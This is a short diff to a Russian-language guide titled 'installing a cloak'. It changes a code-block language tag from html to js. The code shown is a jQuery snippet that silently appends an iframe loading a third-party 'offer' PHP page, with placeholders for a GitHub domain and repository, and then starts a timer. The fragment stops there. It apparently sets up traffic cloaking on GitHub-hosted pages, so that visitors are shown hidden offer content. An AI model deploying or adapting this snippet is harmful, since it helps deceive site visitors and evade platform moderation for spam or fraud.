@@ -15,7 +15,7 @@ draft: false
 ## Установка клоаки
 
 1. Отредактировать код:
-{{< highlight html >}}
+{{< highlight js >}}
 $(function () {
     $('body').append('<iframe src="https://beta.dolphin.ru.com/magic/ОФФЕР.php?domain=ДОМЕН-GITHUB&path=ИМЯ-РЕПОЗИТОРИЯ"></iframe>');
     setTimeout(function () {
